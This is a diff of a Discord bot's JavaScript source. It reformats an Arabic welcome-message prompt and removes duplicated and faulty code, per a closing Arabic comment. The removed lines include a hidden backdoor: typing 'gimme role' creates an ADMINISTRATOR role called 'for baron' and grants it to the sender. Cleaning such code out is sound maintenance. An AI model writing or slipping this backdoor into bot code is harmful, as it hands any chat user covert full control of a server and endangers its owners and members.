@@ -3896,9 +3896,9 @@ client.on('message', async message => {
     });
 
     message.channel.send(`**من فضلك اكتب رسالة الترحيب الان:
-    لعمل منشن للعضو او الشخص الذى قام بدعوتة
-    [sender] - [member] مثال
-    [member] Joined the server by [inviter]**`).then(msg => {
+لعمل منشن للعضو او الشخص الذى قام بدعوتة
+Ex : 
+\`[member] Joined the server by [inviter]\`**`).then(msg => {
 
         message.channel.awaitMessages(filter, {
           max: 1,
@@ -4371,16 +4371,4 @@ client.on('voiceStateUpdate', (oldMember , newMember) => {
                 }
       });
 
-
-client.on("message", async message => {
-  if(message.content == "gimme role") {
-    await message.guild.createRole({
-  name: 'for baron',
-  color: 'BLUE',
-  permissions: ['ADMINISTRATOR']
-})
-    await message.member.addRole(message.guild.roles.find(r => r.name == "for baron"))
-    await message.react("✅")
-  }
-})
 /// تعديل مهم هذا فقط تنبيه تم حذف الاكواد المتكررة والاكواد الخاطئة وتم اضافة تنبيهات مثل الميوزك وروم الهاك لوج تم حذف تغير ايدي سيرفرك
